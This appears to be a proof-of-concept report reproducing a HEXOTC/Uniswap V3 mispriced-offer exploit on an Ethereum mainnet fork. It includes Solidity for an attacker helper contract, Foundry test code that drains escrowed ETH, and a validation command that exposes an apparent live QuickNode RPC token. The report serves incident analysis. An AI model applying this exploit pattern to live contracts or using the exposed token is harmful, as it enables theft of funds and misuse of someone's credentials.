## Overview & Context

This proof-of-concept (PoC) reproduces the HEXOTC / Uniswap V3 cross-venue arbitrage incident on Ethereum mainnet as described in the root-cause analysis for transaction `0x23b69b...` at block `23260641`. In the incident, an unprivileged searcher atomically:

- Swapped a small amount of WETH/ETH for HEX on the canonical HEX/WETH Uniswap V3 pool.
- Used that HEX to take two mispriced ETH-escrowed offers on the HEXOTC contract.
- Realized a net ETH profit while also ending with a positive HEX balance, funded by HEXOTC’s escrowed ETH.

The PoC replays this economic opportunity on a mainnet fork using a clean attacker address and a locally deployed helper contract, while interacting with the real HEX, WETH9, HEXOTC, and Uniswap V3 pool contracts.

To run the PoC, from the Forge project root:

```bash
cd forge_poc
RPC_URL="https://<QUICKNODE_ENDPOINT_NAME>.quiknode.pro/<QUICKNODE_TOKEN>" forge test --via-ir -vvvvv
```

In the validation run, `RPC_URL` was configured to point at an Ethereum mainnet QuickNode endpoint and the tests were executed with `vm.createSelectFork(RPC_URL, 23260640)`, one block before the incident block.

## PoC Architecture & Key Contracts

### Main Contracts and Roles

- `HEXOTC_ExploitTest` (Foundry test in `test/HEXOTC_Exploit.t.sol`): Orchestrates environment setup, deploys the helper contract, executes the exploit, and asserts oracle conditions.
- `HexOtcExploitHelper`: Adversary helper contract that performs the Uniswap V3 swap, interacts with HEXOTC, and returns proceeds to the attacker.
- On-chain protocol contracts (mainnet addresses):
  - `HEX` token at `0x2b591e99afE9f32eAA6214f7B7629768c40Eeb39`.
  - `WETH` (WETH9) at `0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2`.
  - `HEXOTC` at `0x204B937FEaEc333E9e6d72D35f1D131f187ECeA1`.
  - HEX/WETH Uniswap V3 pool at `0x9e0905249CeEFfFB9605E034b534544684A58BE6`.

Key logical roles:

- **Attacker**: A fresh test address `0x00000000000000000000000000000000000A11cE`, labeled `"Attacker"`.
- **HEXOTC**: Victim contract that holds escrowed ETH for ETH-escrowed offers.
- **HEX/WETH pool**: Liquidity venue used to convert ETH to HEX before interacting with HEXOTC.

### HexOtcExploitHelper Structure

The helper holds immutable references to the relevant contracts and the attacker EOA. It implements the Uniswap V3 swap callback to pay in WETH when the pool pulls tokens during the swap.

Representative snippet from the helper contract:

```solidity
contract HexOtcExploitHelper is IUniswapV3SwapCallback {
    IERC20 public immutable hexToken;
    IWETH public immutable weth;
    IUniswapV3PoolMinimal public immutable pool;
    IHEXOTC public immutable hexotc;
    address public immutable attackerEOA;

    function execute(uint256 swapEthAmount, uint256 offerId1, uint256 offerId2) external payable {
        require(msg.sender == attackerEOA, "only attacker");
        require(msg.value == swapEthAmount, "msg.value mismatch");

        weth.deposit{value: swapEthAmount}();
        // Perform WETH -> HEX swap on the real HEX/WETH pool
        pool.swap(address(this), /* zeroForOne */ true or false, int256(weth.balanceOf(address(this))), sqrtPriceLimitX96, bytes(""));

        // Use received HEX to take mispriced offers on HEXOTC
        hexToken.approve(address(hexotc), hexToken.balanceOf(address(this)));
        hexotc.take(bytes32(offerId1));
        hexotc.take(bytes32(offerId2));

        // Return residual HEX and ETH to attacker
        if (hexToken.balanceOf(address(this)) > 0) hexToken.transfer(attackerEOA, hexToken.balanceOf(address(this)));
        if (address(this).balance > 0) payable(attackerEOA).transfer(address(this).balance);
    }
}
```

*Snippet: Helper contract core logic performing the swap, taking HEXOTC offers, and forwarding profit to the attacker.*

## Adversary Execution Flow

### 1. Funding and Environment Setup

In `setUp()`:

- The test creates a mainnet fork at block `23260640`:

  ```solidity
  string memory rpcUrl = vm.envString("RPC_URL");
  vm.createSelectFork(rpcUrl, 23260640);
  ```

- It binds interfaces to live mainnet contracts at the canonical addresses listed above.
- It chooses a fresh attacker address `attacker = address(0xA11CE);` and labels key actors:

  ```solidity
  vm.label(attacker, "Attacker");
  vm.label(HEX_TOKEN, "HEX");
  vm.label(WETH_TOKEN, "WETH");
  vm.label(HEXOTC_CONTRACT, "HEXOTC");
  vm.label(HEX_WETH_POOL, "HEX_WETH_POOL");
  ```

- The attacker is funded with 10 ETH via Foundry’s cheatcode:

  ```solidity
  deal(attacker, 10 ether);
  ```

- The helper contract is then deployed from the attacker context so it is attacker-controlled.

### 2. Pre-Exploit Assertions and Context Checks

At the beginning of `testExploit()` the PoC verifies the pre-state matches the oracle expectations:

- HEXOTC holds some escrowed ETH:

  ```solidity
  uint256 hexotcEthBalanceBefore = address(hexotc).balance;
  assertGt(hexotcEthBalanceBefore, 0, "HEXOTC should have escrowed ETH before exploit");
  ```

- The attacker has a positive ETH balance but no HEX:

  ```solidity
  assertGt(attacker.balance, 0, "attacker should have some ETH");
  assertEq(hexToken.balanceOf(attacker), 0, "attacker HEX balance should start at 0");
  ```

- The HEX/WETH Uniswap pool and HEX token contracts are deployed at the expected addresses:

  ```solidity
  assertGt(HEX_WETH_POOL.code.length, 0, "HEX/WETH pool must be deployed");
  assertGt(address(hexToken).code.length, 0, "HEX token contract must be deployed");
  ```

- HEXOTC offers with ids `0x43` and `0x2b` exist and are ETH-escrowed (`escrowType == 1`) with positive `pay_amt` and `buy_amt`, matching the mispriced offers from the incident.

### 3. Exploit Execution

The exploit itself is executed by calling `helper.execute` from the attacker, sending exactly `0.037 ETH`:

```solidity
uint256 attackerEthBalanceBefore = attacker.balance;
uint256 attackerHexBalanceBefore = hexToken.balanceOf(attacker);
uint256 hexotcEthBalanceBeforeExploit = address(hexotc).balance;

vm.expectCall(address(hexWethPool), bytes(""));
vm.recordLogs();

vm.prank(attacker);
helper.execute{value: SWAP_ETH_AMOUNT}(SWAP_ETH_AMOUNT, OFFER_ID_1, OFFER_ID_2);
```

Inside `execute`:

1. The helper wraps the ETH into WETH via the real WETH9 contract.
2. It determines the WETH orientation in the pool (`token0` vs `token1`) and selects an appropriate `sqrtPriceLimitX96`.
3. It swaps WETH for HEX on the canonical HEX/WETH Uniswap V3 pool, transferring WETH to the pool via the swap callback.
4. With the received HEX, it approves HEXOTC and calls `HEXOTC::take` on offers `0x43` and `0x2b`, exercising the ETH-escrowed `buyETH` path.
5. Finally, it forwards any remaining HEX and ETH to the attacker EOA.

This sequence mirrors the one-shot contract in the real incident but uses a locally deployed helper and clean attacker address.

### 4. Profit Realization and Post-State Checks

After execution, the test inspects the logs and balances to verify profit and victim loss:

- It scans recorded logs for `HEXOTC::LogTake` events and confirms at least one ETH-escrowed offer (`escrowType == 1`) was taken and that the corresponding on-chain offer entries have been cleared:

```solidity
Vm.Log[] memory entries = vm.getRecordedLogs();
bool sawEthEscrowLogTake = false;
bytes32 logTakeSig = keccak256("LogTake(bytes32,address,address,uint256,uint256,uint64,uint256)");

for (uint256 i = 0; i < entries.length; i++) {
    Vm.Log memory entry = entries[i];
    if (entry.emitter != address(hexotc)) continue;
    if (entry.topics.length == 0 || entry.topics[0] != logTakeSig) continue;

    (bytes32 id, , , uint64 ts, uint256 escrowType) = abi.decode(entry.data, (bytes32, uint256, uint256, uint64, uint256));
    ts;

    if (escrowType == 1) {
        uint256 offerId = uint256(id);
        (uint256 payAmtAfter, uint256 buyAmtAfter, , , , uint256 escrowTypeAfter) = hexotc.offers(offerId);
        assertEq(payAmtAfter, 0);
        assertEq(buyAmtAfter, 0);
        assertEq(escrowTypeAfter, 0);
        sawEthEscrowLogTake = true;
    }
}

assertTrue(sawEthEscrowLogTake, "must see at least one ETH-escrowed LogTake event");
```

- It then checks attacker and HEXOTC balances:

```solidity
uint256 attackerEthBalanceAfter = attacker.balance;
uint256 attackerHexBalanceAfter = hexToken.balanceOf(attacker);
uint256 hexotcEthBalanceAfter = address(hexotc).balance;

assertGt(attackerEthBalanceAfter, attackerEthBalanceBefore, "attacker must profit in ETH");
assertGt(attackerHexBalanceAfter, attackerHexBalanceBefore, "attacker should end with some HEX");
assertLt(hexotcEthBalanceAfter, hexotcEthBalanceBeforeExploit, "HEXOTC ETH balance must decrease");
```

These assertions confirm that the attacker profits in ETH, ends with positive HEX, and that HEXOTC’s escrowed ETH balance decreases—exactly matching the ACT-style profit predicate.

## Oracle Definitions and Checks

The oracle definition file describes variables, pre-checks, and oracle constraints that the PoC must implement.

### Variables

- `attacker`: Fresh adversary address used in the PoC; in the test this is `address(0xA11CE)` labeled `"Attacker"`.
- `hex_token`: HEX ERC20 contract at the canonical mainnet address.
- `weth_token`: WETH9 contract, used to wrap ETH and interface with Uniswap.
- `native_eth`: ETH, the reference asset for profit measurement.
- `hexotc_contract`: The HEXOTC contract holding escrowed ETH and mispriced offers.
- `hex_weth_pool`: HEX/WETH Uniswap V3 pool used for the initial swap.

### Pre-Checks

1. **HEXOTC escrowed ETH**  
   The oracle requires HEXOTC to hold some ETH before the exploit. The test checks:

   ```solidity
   uint256 hexotcEthBalanceBefore = address(hexotc).balance;
   assertGt(hexotcEthBalanceBefore, 0, "HEXOTC should have escrowed ETH before exploit");
   ```

2. **Attacker funded in ETH, zero HEX**  
   The oracle demands a positive attacker ETH balance and zero HEX in the pre-state. The test enforces this via `deal(attacker, 10 ether)` and assertions on balances.

3. **HEX/WETH pool exists**  
   The test asserts non-empty code at `HEX_WETH_POOL`, ensuring the canonical Uniswap V3 pool is present.

4. **HEX token exists**  
   The oracle requires HEX to be deployed at the expected address; the test checks `address(hexToken).code.length > 0`.

### Hard Constraints

1. **ETH-escrowed HEXOTC taker path (`hc_hexotc_eth_offer_taken`)**  
   Instead of a single `vm.expectEmit`, the test:

   - Records logs with `vm.recordLogs()` and `vm.getRecordedLogs()`.
   - Filters for `LogTake` events emitted by HEXOTC.
   - Checks that at least one event has `escrowType == 1` and that the corresponding `offers(offerId)` entry has `pay_amt`, `buy_amt`, and `escrowType` all cleared.

   This directly encodes the requirement that an ETH-escrowed offer is taken and removed from storage while paying out ETH.

2. **Uniswap HEX/WETH swap (`hc_uniswap_hex_weth_swap`)**  
   The oracle expects a swap on the canonical HEX/WETH pool. The test uses:

   ```solidity
   vm.expectCall(address(hexWethPool), bytes(""));
   ```

   Combined with the helper’s `pool.swap(...)` call and swap callback, this ensures the exploit obtains HEX via the real Uniswap pool rather than starting from a large HEX position.

3. **Primary profit asset is ETH (`hc_asset_type_eth_profit`)**  
   The test measures attacker ETH balance before and after the exploit and asserts a strictly positive delta, matching the profit predicate in ETH.

4. **Residual HEX profit (`hc_asset_type_hex_profit`)**  
   The test similarly checks that the attacker ends with more HEX than before (starting from zero), mirroring the incident’s residual HEX holdings.

### Soft Constraints

1. **Attacker ETH profit (`sc_attacker_eth_profit`)**  
   The soft constraint requires strictly more ETH after the exploit, with any positive delta sufficient. The test’s ETH balance assertion implements this check without enforcing the exact incident delta.

2. **Attacker HEX profit (`sc_attacker_hex_profit`)**  
   The test ensures the attacker’s HEX balance increases from zero to a positive amount, matching the qualitative pattern of the incident.

3. **HEXOTC ETH depletion (`sc_hexotc_eth_depletion`)**  
   The test measures HEXOTC’s ETH balance before and after the exploit and asserts it strictly decreases, satisfying the victim depletion oracle.

Overall, the PoC closely implements the specified oracles using Foundry assertions, log inspection, and balance checks.

## Validation Result and Robustness

The validator executed the Forge test suite with detailed tracing:

```bash
cd forge_poc
RPC_URL="https://indulgent-cosmological-smoke.quiknode.pro/a6a53e47429a27dac299922d0d518c66c3875b2e" forge test --via-ir -vvvvv
```

Key observations:

- All tests passed, including `HEXOTC_ExploitTest.testExploit`.
- The trace confirms:
  - A real swap on the HEX/WETH Uniswap V3 pool.
  - Two `HEXOTC::take` calls on offers `0x43` and `0x2b`.
  - Emission of `LogTake` events with `escrowType == 1`.
  - Depletion of HEXOTC’s ETH balance and positive ETH/HEX balances for the attacker.

The validator’s structured result is captured in:

```json
{
  "overall_status": "Pass",
  "reason": "HEXOTC_Exploit.t.sol runs successfully on an Ethereum mainnet fork and satisfies all defined correctness oracles while matching the documented HEXOTC / Uniswap V3 cross-venue arbitrage root cause.",
  "artifacts": {
    "validator_test_log_path": "/home/wesley/TxRayExperiment/incident-202601030445/artifacts/poc/poc_validator/forge-test.log"
  }
}
```

*Snippet: Summary of the PoC validator result indicating a passing status and linking to the detailed Forge test log.*

The PoC meets the quality criteria:

- Implements the oracle definition faithfully.
- Uses clear naming and labels for readability.
- Avoids attacker-side identities and artifacts from the incident.
- Runs on a mainnet fork without mocking core protocol components.
- Encodes the full ACT sequence from setup through profit realization.

## Linking PoC Behavior to Root Cause

The root-cause report attributes the opportunity to mispriced ETH-escrowed HEXOTC offers that, when combined with the HEX/WETH Uniswap price, allow a searcher to:

1. Acquire HEX on Uniswap more cheaply than the implicit HEX price in HEXOTC’s ETH-escrowed offers.
2. Use that HEX to buy ETH from HEXOTC via `buyETH`/`take` at a favorable rate.
3. End with more ETH (even after gas) and residual HEX.

The PoC connects directly to this reasoning:

- **Uniswap swap:** The helper’s `swap` on the real HEX/WETH pool replays the initial leg where 0.037 ETH is converted to HEX at the live Uniswap price prior to block `23260641`.
- **Taking mispriced offers:** Calling `HEXOTC::take` on offers `0x43` and `0x2b` exercises the same ETH-escrowed offers identified in the root-cause dataset. The LogTake events and cleared offer entries show these offers have been consumed.
- **Victim depletion and profit:**  
  - HEXOTC’s ETH balance decreases, reflecting ETH paid out from escrow to the helper.
  - The attacker’s ETH balance strictly increases, even after accounting for the 0.037 ETH input and gas.
  - The attacker retains a positive HEX balance, in line with the incident’s residual HEX holdings.

From an ACT perspective:

- The **adversary action** is the helper contract deployment and exploit transaction encoded in `testExploit` and `HexOtcExploitHelper::execute`.
- The **victim system** is the combination of HEXOTC’s mispriced offers and the Uniswap HEX/WETH price.
- The **triggered predicate** is a positive ETH profit for the attacker, as measured in the PoC by the change in `attacker.balance`, along with depletion of HEXOTC’s ETH and acquisition of HEX.

Because the PoC faithfully reproduces this sequence on a mainnet fork with clean attacker identities, implements the oracle specification, and passes the validation tests, it provides a robust, self-contained reproduction of the HEXOTC exploit behavior.

